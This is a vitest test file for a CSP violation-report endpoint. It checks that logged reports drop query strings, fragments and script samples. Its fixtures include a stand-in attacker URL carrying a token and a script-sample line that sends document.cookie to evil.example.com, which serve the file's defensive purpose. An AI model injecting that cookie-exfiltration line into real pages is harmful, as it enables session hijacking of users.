import { describe, it, expect, vi, beforeEach } from 'vitest';
import { POST } from './route';

const mockAuditLog = vi.fn();
vi.mock('@/lib/api/audit', () => ({ auditLog: (...args) => mockAuditLog(...args) }));

beforeEach(() => {
  vi.clearAllMocks();
});

function makeRequest(body) {
  return new Request('http://localhost:3000/api/csp-report', {
    method: 'POST',
    body: JSON.stringify(body),
  });
}

describe('POST /api/csp-report', () => {
  it('logs the violated directive and a query-stripped blocked-uri', async () => {
    const response = await POST(
      makeRequest({
        'csp-report': {
          'violated-directive': 'script-src',
          'blocked-uri': 'https://evil.example.com/steal?token=SECRET123&session=abc',
        },
      }),
    );

    expect(response.status).toBe(200);
    expect(mockAuditLog).toHaveBeenCalledWith(
      expect.objectContaining({
        event: 'csp_violation',
        reason: expect.stringContaining('script-src'),
      }),
    );

    const loggedReason = mockAuditLog.mock.calls[0][0].reason;
    expect(loggedReason).not.toContain('SECRET123');
    expect(loggedReason).not.toContain('session=abc');
    expect(loggedReason).toContain('evil.example.com');
  });

  it('never logs a script-sample field even if present in the report', async () => {
    await POST(
      makeRequest({
        'csp-report': {
          'violated-directive': 'script-src',
          'blocked-uri': 'inline',
          'script-sample': 'document.location="https://evil.example.com/"+document.cookie',
        },
      }),
    );

    const call = mockAuditLog.mock.calls[0][0];
    const serialized = JSON.stringify(call);
    expect(serialized).not.toContain('document.cookie');
  });

  it('accepts the raw-object report shape (not just the csp-report wrapper)', async () => {
    const response = await POST(
      makeRequest({
        'violated-directive': 'style-src',
        'blocked-uri': 'https://cdn.example.com/style.css',
      }),
    );

    expect(response.status).toBe(200);
    expect(mockAuditLog).toHaveBeenCalledWith(
      expect.objectContaining({ reason: expect.stringContaining('style-src') }),
    );
  });

  it('strips a query string and fragment from the blocked-uri', async () => {
    await POST(
      makeRequest({
        'csp-report': {
          'violated-directive': 'connect-src',
          'blocked-uri': 'https://api.example.com/materials/123?apiKey=shh#fragment',
        },
      }),
    );

    const reason = mockAuditLog.mock.calls[0][0].reason;
    expect(reason).toContain('/materials/123');
    expect(reason).not.toContain('apiKey');
    expect(reason).not.toContain('fragment');
  });

  it('returns 200 without logging anything for a malformed body', async () => {
    const request = new Request('http://localhost:3000/api/csp-report', {
      method: 'POST',
      body: 'not json',
    });

    const response = await POST(request);

    expect(response.status).toBe(200);
    expect(mockAuditLog).not.toHaveBeenCalled();
  });

  it('handles a blocked-uri that is a bare keyword like "inline" or "eval"', async () => {
    await POST(
      makeRequest({
        'csp-report': { 'violated-directive': 'script-src', 'blocked-uri': 'eval' },
      }),
    );

    const reason = mockAuditLog.mock.calls[0][0].reason;
    expect(reason).toContain('eval');
  });
});
